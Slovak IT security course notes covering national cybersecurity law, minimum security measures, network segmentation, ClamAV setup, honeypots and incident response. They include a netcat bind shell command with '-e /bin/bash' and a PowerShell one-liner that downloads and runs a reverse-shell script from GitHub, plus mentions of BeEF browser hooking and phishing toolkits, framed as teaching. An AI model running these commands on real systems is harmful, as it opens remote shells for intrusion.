
# ZAKON_KOMPETENCIA_CSIRT_MINIMUM

1. ZAKON: 
[Kybernetická bezpečnosť -NBU (gov.sk)](https://www.nbu.gov.sk/urad/pravne-predpisy/pravne-predpisy/kyberneticka-bezpecnost/index.html)

2. VYHLASKY  NBU:
[165/2018 Z.z. - Vyhláška Národného bezpečnostného ú... - SLOV-LEX](https://www.slov-lex.sk/pravne-predpisy/SK/ZZ/2018/165/#paragraf-2.odsek-2)
[362/2018 Z.z. - Vyhláška Národného bezpečnostného ú... - SLOV-LEX](https://www.slov-lex.sk/pravne-predpisy/SK/ZZ/2018/362/20190101)

>[!warning] 
>ZAKONY TREBA DODRZIAVAT !!! AJ KED NIE SU DOKONALE A ICH SPLNENIE MOZE BYT TECHNICKY, PERSONALNE AJ MATERIALNE NAROCNE. 
 

3. ZAKON URCUJE POVINNOSTI :
<li>POSKYTOVATELOM ZAKLADNYCH SLUZIEB (KRITICKA INFRASTRUKTURA, OBLASTI DOPRAVA, BANKY...)</li>

<li>POSKYTOVATELOM DIGITALNYCH SLUZIEB</li>

<li>A - ma viac ako 50 zamestnancov</li>
<li>B - ma obrat alebo rocnu bilanciu 10.000.000,00 EUR</li>

poskytuje:
A. ONLINE TRHOVISKO 
B. INTERNETOVY VYHLADAVAC
C. CLOUD COMPUTING

>[!warning]
>TO ZE ZAKON  PRIAMO NEURCUJE POVINNOST VASEJ ORGANIZACII ALEBO FIRME NEZNAMENA, ZE NA VASEJ SIETI BUDE NEPORIADOK A NEBUDETE MAT PLAN KYBERNETICKEJ OCHRANY !!!!

4. CYBER SECURITY INCIDENT RESPONSE TEAM
[CSIRT.SK | Vládny CSIRT | Governmental CSIRT](https://www.csirt.gov.sk/index.html)

Vyplati sa sledovat tuto stranku kvoli novym zranitelnostiam a odporucaniam

SCANY VEREJNYCH IP ADRIES A DOMEN:
[Registrácia Achilles | CSIRT.SK (gov.sk)](https://www.csirt.gov.sk/registracia-achilles.html?csrt=2754219148926585670)


1. NAHLASOVANIE INCIDENTOV
2. NAHLASOVANIE ZRANITELNOSTI



## MINIMUM REQUIREMENTS

## A. INTERNA LEGISLATIVA A CHAIN OF COMMAND

a) organizácie kybernetickej bezpečnosti a informačnej bezpečnosti,  DELEGOVANIA A KOMPETENCIE INA
b) riadenia rizík kybernetickej bezpečnosti a informačnej bezpečnosti,  DELEGOVANIE A KOMPETENCIE INA
c) personálnej bezpečnosti,  HR A IT
d) riadenia prístupov,  AJ FYZICKYCH AJ ELEKTRONICKYCH
e) riadenia kybernetickej bezpečnosti a informačnej bezpečnosti vo vzťahoch s tretími stranami,  PRAVNE A IT
f) bezpečnosti pri prevádzke informačných systémov a sietí,   IT SEC
g) hodnotenia zraniteľností a bezpečnostných aktualizácií,  IT SEC
h) ochrany proti škodlivému kódu,  SYSADMIN DEVOPS
i) sieťovej a komunikačnej bezpečnosti, SYSADMIN
j) akvizície, vývoja a údržby informačných sietí a informačných systémov,  DEV, DEVOPS, SYSADMIN
k) zaznamenávania udalostí a monitorovania,  IT SEC
l) fyzickej bezpečnosti a bezpečnosti prostredia,  IT SEC
m) riešenia kybernetických bezpečnostných incidentov,  IT
n) kryptografických opatrení,  KLUCE A CERTIFIKATY, HESLA
o) kontinuity prevádzky, ADMINls -
p) auditu, riadenia súladu a kontrolných činností.

(4) Bezpečnostné opatrenia musia zahŕňať najmenej MINIMUM
a) určenie manažéra kybernetickej bezpečnosti, ktorý je pri návrhu, prijímaní a presadzovaní   
bezpečnostných opatrení nezávislý od štruktúry riadenia prevádzky a vývoja služieb
informačných technológií a ktorý spĺňa znalostné štandardy pre výkon roly manažéra
kybernetickej bezpečnosti, SKUSKA NBU -- 

>[! warning] VYTIAHNE SERVER ZO ZASUVKY - NAJHORSI VARIANT PRE MANAZERA (NIEKEDY TO NAOPAK USETRI CAS A SIRENIE MALWARE)

MANAZER KYBERNETICKEJ BEZPECNOSTI RIESI: 
b) detekciu kybernetických bezpečnostných incidentov,  
c) evidenciu kybernetických bezpečnostných incidentov,
d) postupy riešenia a riešenie kybernetických bezpečnostných incidentov,
e) určenie kontaktnej osoby pre prijímanie a evidenciu hlásení,  SKUTOCNE DOLEZITY BOD
f) pripojenie do komunikačného systému pre hlásenie a riešenie kybe



## B. IMPLEMENTACIA HW A SW RIESENI

#### B.1 MONITOROVANIE ZRANITELNOSTI

> [!warning]
> BUDTE PODOZRIEVAVI !!! KLADTE OTAZKY !!! GREP HARDER !!!

Technické zraniteľnosti informačných systémov ako celku sa identifikujú prostredníctvom :

a) nástroja určeného na detegovanie existujúcich zraniteľností programových prostriedkov a ich
častí,   AV, NMAP, NESSUS
b) nástroja určeného na detegovanie existujúcich zraniteľností technických prostriedkov a ich častí, HARDWARE DIAGNOSTICS - [[SESSION1_HARDWARE_DEVICES_AND_DIAGNOSTICS-ITSEC40]]
c) využitia verejných a výrobcom poskytovaných zoznamov, ktoré opisujú zraniteľnosti
programových a technických prostriedkov.  DOKUMENTACIA

## C. SIETE MINIMALNE POZIADAVKY

#### C.1. PRISTUPOVE PRAVA UZIVATELOV PERMISSIONS

> [! warning] VZDY MINIMALNE POTREBNE !

Linux Permissions UGO - RWX GROUPS - NASTAVENIE MAX PERMISSIONS PRE VSETKYCH

``` bash
chmod 777 SUBOR
chmod ugo+rwx SUBOR
```

GROUPS limituje Device, pristupy do DB 

restricted shell
 
#### C.2. SEGMENTACIA SIETE --- DMZ a ZONY BEZPECNOSTI
{prostredníctvom riadenia bezpečného prístupu medzi vonkajšími a vnútornými sieťami
a informačnými systémami, a to najmä využitím nástrojov na ochranu integrity sietí
a informačných systémov, ktoré sú zabezpečené segmentáciou sietí a informačných systémov;
servery so službami priamo prístupnými z externých sietí sa nachádzajú v samostatných
sieťových segmentoch a v rovnakom segmente musia byť len servery s rovnakými
bezpečnostnými požiadavkami a rovnakej bezpečnostnej triedy a s podobným účelom,}
[[SESSION3_NETWORK_LAYERS_AND_PROTOCOLS-ITSEC40]]

#### C.3. PREPOJENIA SEGMENTOV CHRANENYCH FIREWALLMI S PRINCIPOM NAJNIZSICH PRIVILEGII
{tým, že prepojenia medzi segmentmi a externými sieťami, ktoré sú chránené firewallom
a všetky spojenia sú povoľované na princípe zásady najnižších privilégií,}
[[SESSION4-ITSEC40_NETWORK_DEVICES]]


#### C.4. VPN a dvojfaktorova autentifikacia pre mobilne pripojenie



#### C.5. ZABLOKOVANE PORTY S PRESNE SPECIFIKOVANYM PRISTUPOM IS
{tým, že sieťam alebo informačným systémom sú umožnené len špecifikované služby
umiestnené vo vyhradených segmentoch siete počítačovej siete,}
[[SESSION3_NETWORK_LAYERS_AND_PROTOCOLS-ITSEC40]]

#### C.6. PRIPOJENIE NA EXTERNU SIET IBA CEZ FIREWALL A IDS  INTRUSION DETECTION SYSTEM / IPS 
[[SESSION5-INTRUSION DETECTION SYSTEM]]


#### C.7. PRIPOJENIE SERVEROV NA EXTERNU SIET Z DMZ PODLA ODPORUCANI VYROBCOV -- PRODUKCIA, 
Hlavne webservery, api, servery, ktore maju poskytovat informacie na internet a maju byt viditelne pre okolite prostredie ci uz statickou IP alebo Domenou

#### C.8. AKTUALIZOVANYM ZOZNAMOM VSTUPOV A VYSTUPOV BODOV DO A ZO SIETE
DOKUMENTACIA  - PRAVIDELNE KONTROLOVAT

#### C.9. MONITOROVANIE POKUSOV O VNIKNUTIE DO SIETE  - LOGOVANIE A ANALYZOVANIE
Okrem IDS je dolezite mat k dispozicii aj dalsie udaje, ktore mozu smerovat k odhaleniu a zachyteniu zacinajuceho alebo prebiehajuceho utoku
[[SESSION5-LOG MANAGEMENT]]

#### C.10. BLOKOVANIE SPOJENIA ZO ZNAMYCH ADRIES
Tuto funkciu nam zabezpeci Dynamicky Firewall na vstupe do siete.
[[SESSION4-ITSEC40_NETWORK_DEVICES]]


#### C.11. SPOJENIE APLIKACII MEDZI SEBOU IBA CEZ POVOLENE PORTY
Nastavenie Firewallov na Endpointoch a Serveroch... vsetko ostatne zakazat ak sa da :)
Vid ukazku komunikacie PC vo Wiresharku vystupny port si voli pocitac !
[[SESSION3_NETWORK_LAYERS_AND_PROTOCOLS-ITSEC40]]

#### C.12. DPI A ZAZNAM PACKETOV NA VSTUPE DO SIETE
DEEP PACKET INSPECTION JE VACSINOU FUNKCIA SECURITY APPLIANCE - Funkcia Firewallu alebo SUPERSWITCHA 
[[SESSION4-ITSEC40_NETWORK_DEVICES]]


#### C.13. IDS A IPS  INTRUSION DETECTION SYSTEM A INTRUSION PREVENSION SYSTEM
[[SESSION5-INTRUSION DETECTION SYSTEM]]
suricata, snort 

#### C.14. NA VYSTUPE FILTROVANIE PACKETOV
Pri IT bezpecnosti je dolezite nielen byt obozretny smerom do siete ale aj zo siete ! 
Pokusy o EXFILtraciu chranenych dokumentov a udajov mozu mat na svedomi nielen nezodpovedni uzivatelia, ale aj reverzne shelly, SPYWARE alebo MALWARE. 
<li>Kos na spinave pradlo</li>


#### C.15. 2FA na kazdy vzdialeny ADMIN pristup do siete  SSH, Admin konzoly

Je nebezpecne pri vzdialeno pristupe pouzivat admin hesla chranenej LAN. Vzdialeny pristup cez RDP alebo VPN treba obmedzit !!!


#### C.16 SCAN VULNERABILITIES

netlas, shodan, nmap, nessus, burp suite - webapp a webove servery
vykonávaním pravidelného alebo nepretržitého posudzovania technických zraniteľností, najmä
identifikácie možnej prítomnosti škodlivého kódu zariadenia, ktoré sa vzdialene pripája do
internej siete, alebo zmluvného zaručenia vrátane preukázania plnenia tejto povinnosti.

#### ZERO TRUST - UZIVATEL MA PRISTUP LEN K PRESNE DEFINOVANYM ZDROJOM - KAZDA SIETOVA AKTIVITA JE SKUMANA 


## D. FYZICKA BEZPECNOST

1. UMIESTNENIE SIETE - BEZPECNOSTNE ZAMKY A MANAZMENT KLUCOV A PRISTUPU
2. PRAVIDLA PRACE - ZONIFIKACIA PRACOVISKA, ODDELENIE SUKROMIA A PRACE
3. DODRZIAVANIE UCELU IT - ZARIADENIA SA NESMU POUZIVAT NA INE VECI
4. UPS  - ZALOZNE ZDROJE NA SIET A SERVERY
5. EVIDENCIA A OZNACENIE PROSTRIEDKOV -
6. VYMAZAVAVIE A LIKVIDACIA PROSTRIEDKOV - #DUMPSTERDIVING
7. FYZICKY PRENOS MIMO PRIESTOROV - PRAVIDLA
8. MANIPULACIA S DOKUMENTACIOU A PAMATOVYMI MEDIAMI - USKLADNENIE/LIKVIDACIA

?? dimenzovanie a fyzické parametre sietí a hardvéru, ktoré priamo alebo nepriamo ovplyvňujú
najväčšiu prípustnú dobu výpadku siete a informačného systému ??  ZALOZNA INFRASTRUKTURA - UPS, Nahradne servery


## E. PLANOVANIE REAKCIE
### E.1 PLANOVANIE A KRIZOVE PLANY

<li>krizove plany na najpravdepodobnejsie scenare</li> 
<li>reakcne doby</li> 

### E. 2 ZDROJE  A FINANCIE
<li>krizove plany na najpavdepodobnejsie scenare</li> 

### E.3 KOMUNIKACNY PLAN
<li>zvolavanie a pohotovost</li>
<li>komunikacne prostriedky a kanaly</li>
<li>externa pomoc</li>
<li>nahlasovanie incidentov</li> 

### E.5 CASOVY HARMONOGRAM NA OBNOVU FUNGOVANIA NA MINIMALNU FUNKCNOST
<li>obnovenie v krizovej minimalnej prevadzke s monitorovanim v HODINACH</li>

### E.6 CASOVY HARMONOGRAM NA OBNOVU A FUNGOVANIE NA NORMAL
<li>obnovenie v krizovej plnej prevadzke s monitorovanim v HODINACH</li> 

### E.7 TESTOVANIA A VYHODNOCOVANIA PLANOV OBNOVY S CIELOM VACSEJ EFEKTIVITY
<li>Vyhodnotenie INCIDENTU, FUNKCNOST PLANOV, CHYB A MOZNEHO ZLEPSENIA - CENA</li> 

## F. BACKUPY A DOKUMENTACIA

### F.1 V PRAVIDLACH
a) frekvenciu a rozsah jej dokumentovania a schvaľovania,
b) určenie osoby zodpovednej za zálohovanie, BACKUP MANAGER :)
c) časový interval, identifikáciu rozsahu údajov, dátového média zálohovania a požiadavku
zabezpečenia vedenia dokumentácie o zálohovaní,
d) požiadavku umiestnenia záloh v zabezpečenom prostredí s riadeným prístupom,
e) požiadavku zabezpečenia šifrovania záloh obsahujúcich aktíva klasifikačného stupňa chránené
a prísne chránené,
f) požiadavku na vykonávanie pravidelného preverenia záloh, testovanie obnovy záloh
a precvičovanie zavedených krízových plánov najmenej raz ročne

### F.2 OPTIMALNY MODEL OSOBNEHO ZALOHOVANIA:

3 kopie v roznych lokalitach  USB
2 na roznych mediach
1 kopia na Cloude (ZASIFROVANA) *  mimo lokacie

* podla internych predpisov a charakteru informacii v IS

### F.3 SYSTEM RYCHLEJ OBNOVY POMOCOU REPLIK A SNAPSHOTOV

[[SESSION5 - SYSTEM RYCHLEJ OBNOVY]]

## A. ANTIVIRUSOVY PROGRAM NA ENDPOINT AJ SERVER

>[!warning] ## AK SI SERIF ZASTUPCU SI VYBERAJ OPATRNE !



Vzdy ked instalujes softver zvazuj aj hodnovernost jeho poskytovatela. Specialne pri AV davas pristup k svojim suborom na vyhladavanie a skumanie. 

ESET - SLOVACI
SOPHOS - Vyvojari v Linzi, Anglicka spolocnost s backgroundom v Cybersecurity
ClamAV - Open SOurce  CISCO - ZADARMO !!!

> [!info] SIGNATURE - Digitalny otlacok palca skodliveho virusu alebo malware. Hexadecimalny kod, ktory sa opakuje pri infikovanych pocitacoch.

DATABAZA VSETKYCH ZNAMYCH VIRUSOV A MALWARE S MOZNOSTOU SKUMANIA A VYHLADAVANIA
[VirusTotal - Home](https://www.virustotal.com/gui/home/search)


### A.1 Instalacia na Windows:

[ClamAVNet](https://www.clamav.net/)

Po nainštalovani inštalátorom sa umiestni do adresára:

``` powershell
C:\Program Files\ClamAV
```

### A.2 Konfigurácia na Windows

Prednastavené konfiguračné súbory pre freshclam.exe a clamd.exe sú a adresári

``` powershell
C:\Program Files\ClamAV\conf_examples
```

>[!warning]
>Nezabudni v konfiguračných súboroch odstrániť slovko EXAMPLE !!!


### A.3 Instalacia na Linux

``` bash
sudo apt-get update
sudo apt-get install clamav clamav-daemon
```

>[!info]
>Na Linuxe sú konfiguračné súbory funkčné ale nezabudni si ich skontrolovať.

### A.4 Časti CLAM AV

freshclam  - zabezpečuje update signatur   cca 8.7mil signatur

clamscan  - jednorazovy scan   

>[!warning ] ČO SKENOVAŤ !!! 
PRIORITA   - executables a nebezpecne formaty
VOLITELNÝ je zbytok súborov 

clamd  - demon s automatizaciou a množstvom nastavení ako a kedy

clamdtop - dashboard v konzole, ktorý ukazuje prácu antivírusu v reálnom čase

sigtool - pridavanie vlastnych signatur

A.5  UMELÁ INTELIGENCIA V SLUŽBÁCH IT SEC
Microsoft doslova pred pár dňami predstavil Microsoft SECURITY PILOT, umelú inteligenciu, ktorá sa bude starať o bezpečnosť Vašich sietí a počítačov.

## B. PASCE NA HACKEROV - HONEY POTY:

Naša doterajšia práca sa zameriavala na to aby sme čo najskôr zistili kybernetický útok na našej sieti.

<li>Máme všade SILNÉ HESLÁ</li>
<li>Máme na všetkých zariadeniach posledné UPDATY A PATCHE</li>
<li>Máme na každom počítači Antivírus</li>
<li>Máme na každom počítači individuálne nastavený Firewall</li>
<li>Na vstupe do každého segmentu máme Dynamický Firewall s DPI</li>
<li>Dôležité miesta v sieti nám stráži Suricata IDS</li>
<li>Máme zoskenované všetky zraniteľnosti každej subsiete</li>
<li>Všetky logy sa ukladajú zašifrovaných spojením na špeciálny server LOG MANAGEMENT</li>

Ako ešte môžeme zvýšiť ochranu našej siete ?

### B.1. BIELE ZOZNAMY - WHITELIST

Biele zoznamy sú nastavenia na sieťových zariadeniach, ktoré umožňujú komunikáciu iba zariadeniam, ktoré sú uvedené v týchto BIELYCH ZOZNAMOCH. Akonáhle sa do siete prihlási nové zariadenie nikto sa s ním nebude baviť.

>[!warning  ]
>HACKER: Počítače a zariadenia vo WHITELIST identifikujeme podľa IP, ktorá sa môže zmeniť alebo podľa MAC adresy. Túto však vieme tiež zmeniť pomocou Macchanger v KALI LINUXE. Router sa potom bude musieť rozhodovať medzi nami = trošku mu zamotáme hlavu.


### B.2 Medové hrnce - HONEPOTS A HONEYNETS

Umiestnením pasce na hackerov v určenom segmente, lákame Hackeov a Malware na návštevu. To čo sa zdalo pred chvíľou ako ľahká korisť, aktuálne zbiera dáta o útočníkovi a bije na poplach. Honeypoty sa navonok tvária ako zraniteľné počítače, ktoré majú otvorené porty, zraniteľný software alebo slabé heslo. V skutočnosti neobsahujú nič a ich úloha je indikovať kybernetický útok a informovať o tom svojho ŠERIFA.

#### B.2.1 JEDNODUCHÝ HONEYPOT V JAZYKU PYTHON3

``` python
import asyncio
import time

async def handle_connection(reader, writer):
	peername = writer.get_extra_info('peername')
	while True:  # nekonecny cyklus 
		data = await reader.read(1024)  # nacita byty
		if not data:
			break  # tak nic vrat sa do cyklu
		print(time.time(), peername, data.decode())   # zobraz na obrazovku
		writer.close()

async def main():
    server = await asyncio.start_server(handle_connection, '0.0.0.0', 23) # port 
    async with server:ls
    
        await server.serve_forever()  # server bez do nekonecna 

if __name__ == '__main__':
    asyncio.run(main())

```


CHAMELEON 
```bash
git clone https://github.com/qeeqbox/chameleon.git
cd chameleon
sudo chmod +x ./run.sh
sudo ./run.sh test
```

>[!info] HONEYPOTY
>Technickych rieseni pre implementaciu Honeypotov je mnozstvo. Od jednoduchych skriptov az po rozsiahle Honeynets kde prebieha ziva komunikacia medzi virtualnymi uzivatelmi.


## C. ZRANITELNOST WEB BROWSERA

Aj napriek všetkému zabezpečeniu si moderná doba vyžaduje aby na každom počítači bol Internetový prehliadač BROWSER. Tento BROWSER postupom času získal istú schopnosť, nielen komunikovať smerom k užívateľovi ale aj od užívateľa smerom k internetu. 

Získal kontrolu nad zaraideniami ako WEBKAMERY, MIKROFÓNY, uchováva HESLÁ, KOLÁČIKY, má priestor kde si vie ukladať údaje a súbory.

>[!warning  ]
>### NEPRIATEĽ POČÚVA  !!!


### C.1 DEMONŠTRÁCIA MOŽNOSTÍ FRAMEWORKU BEEF

Beef je exploitačný framework, ktorý sa tvári ako Web Server. Základom jeho fungovania je poskytovania falošnej stránky na ktorej beží skript hook.js

 ![BEEF Framework ](BEEF.png)

>[!info] 
>HACKER:  Pomocou hook.js vieme zahákovať browser podobne ako je to vo filmoch o pirátoch. Akonáhle je BROWSER zaháknutý môžeme ho pomocou príkazov ovládať a zbierať cenné informácie o užívateľovi.
> 





## D. Zadné vrátka alebo Reverzné shelly

### D.1 Zadné vrátka

Možností ako si nechať otvorené zadné vrátka je veľa, môžeme využiť programovacie jazyky alebo softvér. 

Obľúbenými vrátkami je nechať spustený softvér ako Teamviewer alebo iný spôsob vzdialeného prístupu v určitom čase. Občas stačí premenovť súbor a nechať ho bežať ako démona. 

#### D.1.1 ZADNÉ VRÁTKA POMOCOU NETCAT

Netcat je užitočná sieťová utilitka, ktorá nám umožňuje na jednej strane počúvať LISTENER čosi ako stetoskop a na druhej strane vysielať, čosi ako mikrofón. Počúvame samozrejme nie zvuk ale sieťovú prevádzku pomocou SOCKETOV spojenia IP adresy počítača a čísla PORTU.

Na jednom PC  pustíme LISTENER:
``` bash
sudo apt-get update
sudo apt-get install ncat

ncat -lk -p 6868   # počítač počúva na porte 6868 na svojej IP

```


Na druhej strane  sa napojíme na LISTENER a začneme mu posielať data v podobe súboru alebo textu.
``` bash
ncat IP_ADRESA PORT
```


>[!info] 
>SYSADMIN:  Okrem toho, že sme preverili, že oba počítač sa vedia spojiť vznikol ako vedľajší produkt improvizovaný CHAT. Komunikácia pomocou textu funguje OBOJSMERNE.
> 

>[!warning  ]
>### ITSEC: NETCAT POSIELA DÁTA NEŠIFROVANE  !!! Pokiaľ chceš použiť šifrovanie použi program Cryptocat


Netcat je často nainštalovaný na množstve počítačov a umožňuje skenovať sieť, vytvárať rôzne improvizované sieťové kanály, kontrolovať priehodnosť siete a pod. Má mnoho variácii a mien nc, ncat, netcat

>[! warning]
>HACKER: Najnebezpečnejšia funkcia NETCATU je  možnosť po pripojení vykonať nejaký príkaz v shelly. Napríklad   -e /bin/bash nám umožní ovládať Linuxový počítač cez terminál a zadávať mu príkazy.  Na windowse ho treba smerovať na cmd.exe alebo Powershell 
> 


Na PC kde chceme mať zadné vrátka:
``` bash
sudo apt-get update
sudo apt-get install ncat

ncat -lk -p 6868 -e /bin/bash  # počítač počúva na porte 6868 na svojej IP

```


Na druhej strane  
``` bash
ncat IP_ADRESA PORT
```


>[!info] 
>HACKER:  Tento prístup je však limitovaný a umožňuje iba jednoduché príkazy v shell


### D.2 REVERZNÝ SHELL NA WINDOWS

Väčšina sietí ma striktne nastavenú politiku čo može do siete sby sme ju ochránili od vonkajších hrozieb. Najväčšia bezpečnostná hrozba je však vo vnútri siete, nepreškolený alebo hlúpy užívateľ prípadne priveľmi sebavedomý SYSADMIN.

Pri REVERSE SHELL nás kontaktuje PC z chránenej LAN a ponúka nám prístup k svojmu príkazovému riadku. Stačí len nastaviť kde nás má kontaktovať a vždy keď sa ozve tak nás nakontaktuje sám. Prejde cez Firewall ako legitímna komunikácia z vnútra siete.

LISTENER NA STRANE ÚTOČNÍKA
``` bash
ncat -lvnp 6868 -s IP HOST
```


REVERSE SHELL POMOCOU SKRIPTU V POWERSHELL:

>[!warning  ]
>### NEPRIATEĽ POČÚVA  !!! Tento skript je NEBEZPEČNÝ A BOL STIAHNUTÝ Z GITHUBU !!! 

[antonioCoco · GitHub] (https://github.com/antonioCoco) a je voľne šírený pod MIT licenciou.
Autor je Analytik Malware a reverzný inžinier pre Windows.

``` powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell IP HOST  6868
```

>[!info] 
>SYSADMIN:  V našom prípade všetko dopadlo dobre, škodlivý kód zachytil ANTIVIR a zabránil mu v poskytnutí údajov cieľovému serveru. Štandardne je tiež v ExecutionPolicy Windows, že nemá spúšťať žiadne ps1 skripty.





## E: WSL2 UBUNTU Terminal - LINUX NA DOSAH RUKY

V tejto fáze kurzu už by ste mali vedieť čosi o VM a kontajneroch. Windows postupne vychádza v ústrety ľuďom, ktorí spravujú a pracujú s Linuxovými serverami a otravuje ich CommandPrompt alebo Powershell. Linux bash je JEDNODUCHO SUPER.

S Microsoft STORE si môžete nainštalovať do svojeho systému WSL2 čo je v podstate hypervisor, ktorý Vám umožní nainštalovať si do WIN10 a vyššie oficálne Microsoftom podporovaný Linux rôznych farieb a príchutí. Áno aj KALI LINUX.

Je aj ľahšia forma a to UBUNTU Terminal, ktorý Vám cez štandardný Windows Terminal dovolí otvárať UBUNTU Shell. POZOR MÁ INÚ IP ADRESU AKO WINDOWS.



WSL2 Install Ubuntu Terminal
https://www.microsoft.com/store/productId/9P7BDVKVNXZ6

Ak zadáte tento adresár môžete používať celý File SYstem vašeho počítača
``` bash
cd /mnt/c/
```



## F. IT SEC CLUSTER A WARGAMING

### F.1 IT SEC ONLINE VZDELAVANIE

V rámci toho kurzu som Vám ukázal množstvo vecí, ktoré by ste mali teoreticky aj prakticky ovládať ak sa chcete venovať IT SEC. Problém je, že aj keď sme si nejaké veci ukazovali na mojej cvičnej sieti v tzv. HACKLABE či už na virtuálnych zariadeniach, alebo na skutočných, **praktické schopnosti získate iba sami**. Aby sme Vám túto cestu uľahčili vytvorili sme pre Vás sieť do ktorej sa budete pripájať a skúšať si rôzne ITSEC a hackerské nástroje cez Linux Shell.

Vnútorná sieť je oddelená od internetu a preto sa na ňu dá napojiť pomocou BRIDGU z internetu prostredníctvom SSH pripojenia.


### F.2 WARGAMING - HACKERSKE HRY

FORTIS AURIS o.z okrem vzdelávania a bezplatného poradenstva či osvety, vytvára VIRTUALNE BOJISKA A SCENARE PRE HACKEROV.  Medzi Hackermi sú obľúbené najmä:

<li>CTF získaj vlajku</li>
<li>DOMINATION obsaď najväčšiu časť CLUSTRA</li>
<li>HACKATHON spoločné riešenie problému</li>
<li>THREAT HUNT </li>
<li>ďalšie</li>


# http://188.121.170.77

``` bash & powershell
ssh itsec2023@188.121.170.77
```

Na vnútornom perimetri budú pre Vás pripravené počítače na ktorích  môžete využívať :

<li>ping traceroute ifconfig</li>
<li>skenovanie nmap</li>
<li>crackovanie hesiel pomocou hashov roznych uzivatelov</li>
<li>komunikovat s pripojenymi uzivatelmi pomocou wall, who, talk</li>
<li>pisanie pythonovskych skriptov v Python3</li>
<li>nastavovanie firewallov pomocou UFW a iptables</li>
<li>jednoduche socketservery a honeypoty</li>
<li>vytvarat jednoduche webservery a prezerat ich html stranky pomocou links2</li>


>[!info  ]
>### HESLO DO CLUSTRA VAM BUDE NA POZIADANIE ZASLANE V ZOOM CHATE.


# A. Incidenty, Prevencia a Opatrenia
#incidentresponse

1. PLAN (DEFINOVANE CSIRT, MENA, KOMPETENCIE, ZDROJE, NASTROJE, CASOVY HARMONOGRAM)

2. REALIZACIA OPATRENI
FAZA 1 -IDENTIFIKÁCIA INCIDENTU
FAZA 2 IZOLÁCIA INCIDENTU
FAZA 3 ANALÝZA DAT O INCIDENTE
FAZA 4 ODSTRÁNENIE NAKAZY
FAZA 5 OBNOVA SYSTEMU 
FAZA 6 POUČENIE, ANALYZA POSTUPOV PLANOV A CHYB


## A.1 DDOS - Distributed Denial of Services

>[!warning]
>IT SEC: Neustale monitorujte mnozstvo komunikacie na vonkajsich portoch serverov v DMZ !!!

>[!info] 
>HACKER:  Utok spociva v navyseni dopytu na server s mnozstva neznamych IP adries cim dochadza k pretazeniu servera a nestiha servovat odpovede. Pre beznych klientov bude Vas server nepristupny a sluzba prestane fungovat. Dlhodobe zatazenie moze sposobit aj dalsie technicke problemy. 

Utok ma dve podoby... jedna je rychlo posielat requesty na server a druha je zdrzovat TCP spojenie a poskytovanie poziadaviek



A.1.1 PREVENCIA

a. Preverte u ISP a poskytovatela hostingu, Cloudu a domeny moznosti tzv. MITIGACIE v pripade utoku. 

b. Pripravte WHITELIST kritickych odberatelov sluzieb

c. Prioritizujte stalych odberatelov

d. Pripravte moznosti presmerovat Traffic na ine zalozne servery a tym kratkodobo navysite kapacitu sluzby. 


UKÁŽKA	
``` bash
hping3 
```

### A.1.2 OPATRENIA

Ak spozorujete masivny nárast prichádzajúceho trafficu na port pokračujte podľa prichystaného plánu. Packety pôjdu z veľkého množstva IP adries a prvá a najväčšia línia obrany vznikne u Vaľeho IS, Webhostingu či  poskytovateľa Internetu alebo Cloud na ktorom beží Váš server. Platí, že čím väčší provider služby tým väčšie sú jeho možnosti Mitigácie a odrazenia útoku.

V tomto momente aktivujte Whitelisty svojich stálych a d§ležitých zákazníkov pre ktorích musíte servis udržať ONLINE.

Navýšte krátkoddobo kapacitu Vašeho servera čo sa týka jeho výkonu aj sieťových rozhraní.

Dokumentujte odkiaľ útok ide a skúste zistiť PREČO.

>[!info] PRIKLAD ANONYMOUS vs. SAUDSKÁ ARÁBIA
>


## A.2 - PHISHINGOVÁ KAMPAŇ

A.2.1 PREVENCIA

>[!info] 
>IT SEC: Cieľom Phishingovej kampaňe je aby užívateľ poskytol útočníkovi bud svoje prihlasovacie údaje k službe, alebo spustenie škodlivého kódu pomocou linku či súboru. 

a. Najefektívnejšou prevenciou je preškolenie USEROV a upozornenie ich na možnosti a ciele útočníkov. Čím je útok viac cielený bude aj náročnejšie odhaliť phishingový mail.

b. Ďalším preventívnym opatrením nepoužívanie Endpointov a Serverov v chránenej sieti na súkromné využitie. Tým sa vyrieši veľa problémov s falošnými prihlasovacími formulármi do Sociálnych sietí , Internetbankingu a pod.

c. Dobrý nápad je aj zakázanie preposielania typov súborov, ktoré môžu obsahovať škodlivý kód.
 
A.2.2 OPATRENIA

a. Preveriť koľko užívateľov dostalo takýto mail.  Kvalita toho Phishingu. Whaling

b. Vylúčiť možnosť, že na neho niekto klikol a to aj pohovorom aj kontrolou sieťovej prevádzky, logov a AV.

c. Identifikovať ZDROJ odkiaľ prišiel a zakázať ho na Firewalle alebo Filtroch.

d. Zachovať kópiu mailu a prílohy na forenzné skúmanie.

>[!warning] 
>ITSEC: AK SA ODHODLATE VYSKÚŠAŤ SVOJE SCHOPNOSTI A SKÚMAŤ ROB TO OPATRNE VO SVOJOM HACKLABE = NA ŠPECIÁLNE VYTVORENOM PC VO VM IZOLOVANOM SANDBOXE.

>[! demo]
>SET - SOCIAL ENGENEERING TOOLKIT - zrodenie Phishingoveho mailu.

 
## A.3 - MALWARE / RANSOMWARE infekcia

INFO: Cieľom hackera je získať prístup k informáciám, výpočtového výkonu, kryptomene či znehodnotiť dáta a vypýtať si odmenu za ich opätovné sprístupnenie. RANSOMWARE sa väčšinou prihlási po zašifrovaní dát a vypíta si odmenu. PENIAZE NIKOMU NEDÁVAJTE 

### A.3.1 PREVENCIA

a. BIOS Ochrana proti zapisu - pravdepodobnost mala ale treba najnovsi FIRMWARE

b. BROWSER na firemne veci(vypnuta Java, ActiveX a pod) a iny na sukromne

c. Virtualizacia aplikacii  

>[! demo]
>DOCKER  - SANDBOXING - kontajner s vlastnym VOLUME (diskom)


d. IDS, IPS, AV, Logy a všetko čo nám pomôže kedy a ako sa dostal Malware do siete a určí aj rozsah infekcie.

e. Systém rýchlej obnovy z BACKUPOV

>[!info]
>AK  STE BOLI NAPADNUTÝ RANSOMWARE  neklesajte na duchu - KAVALERIA JE UZ NA CESTE. Desiatky ľudí pracujú na tom aby Vaše dáta zachránili. Títo neviditeľní hrdinovia hľadajú cestičku ako prelomiť šifrovanie a väčšinou to chvíľu trvá. DISK OZNAČTE A ODLOŽTE DO SKRINE. O NEJAKÝ ČAS HO POMOCOU NEJAKÉHO NÁSTROJA ODŠIFRUJETE.


### A.3.2 OPATRENIA :


1. Identifikacia MALWARE a infikovanych HOSTOV

